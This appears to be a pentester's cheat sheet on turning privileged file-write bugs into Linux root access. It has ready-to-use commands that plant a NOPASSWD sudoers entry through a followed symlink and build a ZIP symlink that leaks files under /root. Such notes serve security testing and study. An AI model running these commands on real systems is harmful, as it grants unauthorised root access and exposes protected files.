# Privileged file-write paths

## What the primitive gives you
Note: privileged caller, controllable source/destination, overwrite vs append, symlink handling, output owner/mode.

| Destination | Needs |
| --- | --- |
| sudoers include | Include dir active, accepted filename, mode `0440`, valid syntax |
| passwd/shadow | Correct record format; keep existing entries |
| cron | System vs user-crontab format, accepted owner/mode, schedule |
| SSH authorized_keys | Right account/home/key path, accepted metadata, sshd login policy |

- Empty password field is rejected by `pam_unix` unless `nullok`; removing the `x` in passwd is not a guaranteed root login.

## Symlink-following writer
A privileged tool copies source → caller-chosen destination and follows a destination symlink. Confirm it follows rather than replaces/refuses.

```bash
printf '%s\n' '<USER> ALL=(root) NOPASSWD: ALL' > payload
chmod 440 payload
ln -s /etc/sudoers.d/<NAME> dst_link
# run the privileged tool: payload -> dst_link
sudo -i
```
- Source mode does not set the destination's mode/owner: check what the tool creates.
- A bad sudoers file breaks sudo: validate with `visudo -c` first where possible.

## Archives (ZIP symlinks)
```bash
ln -s /root/<FILE> leak
zip --symlinks links.zip leak
```
- Stores the link, not the target's bytes: needs a privileged extractor/reader that follows it.
- Destination-side links matter if the extractor follows them while writing; member order matters.
- Rejecting `../` names does not stop symlink tricks.
